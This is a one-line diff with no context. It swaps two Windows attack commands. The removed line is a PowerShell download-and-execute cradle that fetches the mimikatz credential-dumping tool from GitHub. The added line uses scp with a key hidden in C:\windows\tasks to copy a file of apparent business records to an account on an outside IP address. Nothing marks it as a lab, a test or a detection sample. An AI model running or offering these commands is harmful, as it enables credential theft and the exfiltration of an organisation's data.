@@ -1,1 +1,1 @@
-powershell.exe -c iex(New-Object Net.webclient).downloadstring('https://github.com/ParrotSec/mimikatz/raw/refs/heads/master/x64/mimikatz.exe')
+Scp -i C:\windows\tasks\server.pem Q4_McD_Records.txt bstamm@4.150.200.205:/tmp/records.txt
